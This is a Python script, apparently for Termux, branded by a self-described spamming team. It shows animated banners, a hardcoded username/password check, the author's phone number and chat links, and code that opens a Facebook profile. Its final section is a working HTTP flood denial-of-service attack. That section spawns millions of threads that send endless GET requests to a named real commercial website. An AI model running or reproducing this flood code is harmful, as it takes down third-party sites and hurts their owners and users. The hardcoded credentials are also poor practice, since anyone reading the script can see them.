import time 
import sys

def animated(text):

  for x in text:

    sys.stdout.write(x)

    sys.stdout.flush()

    time.sleep(0.05)


logo = """
┌───────────────────────────────────────────────┐
│         ▗▄▄▖▗▖ ▗▖ ▗▄▖ ▗▖ ▗▖▗▄▄▄▖▗▖              │
│         ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌▗▞▘  █  ▐▌              │
│          ▝▀▚▖▐▛▀▜▌▐▛▀▜▌▐▛▚▖   █  ▐▌              │
│         ▗▄▄▞▘▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▗▄█▄▖▐▙▄▄▖           │
├───────────────────────────────────────────────┤
│                                               │
│              WELCOME TO SHAKIL             │
│                                               │
│             [ PRESS ENTER TO START ]          │
│                                               │
└───────────────────────────────────────────────┘
"""
print(logo)



lgo = """

 ▗▄▄▖▗▖ ▗▖ ▗▄▖ ▗▖ ▗▖▗▄▄▄▖▗▖   
▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌▗▞▘  █  ▐▌   
 ▝▀▚▖▐▛▀▜▌▐▛▀▜▌▐▛▚▖   █  ▐▌   
▗▄▄▞▘▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▗▄█▄▖▐▙▄▄▖
                              
"""
#CYBER SHAKIL
name = """"\033[0;31m
          TEAM    : 𝐂𝐘𝐁𝐄𝐑 𝐒𝐔𝐓𝐄𝐑𝐓𝐄𝐘 𝟔𝟕 𝐒𝐏𝐀𝐌𝐈𝐍𝐆 𝐙𝐎𝐎𝐌
          AUTOR   : CYBER SHAKIL RS
          MINCR   : ROHAN
          FB GRP  : https://m.me/j/AbZaZZTeumAz_2sW/
          WTAPS   : 01771705299
"""     
a ="\033[0;32m★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★ "
#animated(shakil)
animated(a) 
animated(lgo)
animated(a)
animated (name)
animated (a)

import os

username = "Shakil"

password = "Shakil67"



givenUsername = input("\033[0;34m your username: ")

if givenUsername == username:

  print("Correct Username")

givenPassword = input("Enter your password:")

if givenPassword == password:

 print("Correct password")

 #os.system('figlet LOG IN SUCCES')



else:

 print("Wrong User")

import sys

import time

text = "𝐂𝐘𝐁𝐄𝐑 𝐒𝐔𝐓𝐄𝐑𝐓𝐄𝐘 𝟔𝟕 𝐒𝐏𝐀𝐌𝐈𝐍𝐆 𝐙𝐎𝐎𝐌"

#text2 = "01771705299"

# for x in text:

#   sys.stdout.write(x)

#   sys.stdout.flush()

#   time.sleep(0.05)

def animated(text):

  for x in text:

    sys.stdout.write(x)

    sys.stdout.flush()

    time.sleep(0.05)

#animated(text2)

animated(text)

#animated(text2)

os

facebook_username = "100074182131499"
url = f"https://www.facebook.com/{facebook_username}"

os.system(f'termux-open {url}')


import requests
import threading

def send_request():
    try:
        while True:
            response = requests.get("https://kakubazar.com/")
            print("\033[0;35m requests sent")
    except:
        pass

def start_ddos():
    threads = []
    for _ in range(3500000):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()

    for thread in threads:
        thread.join()

start_ddos()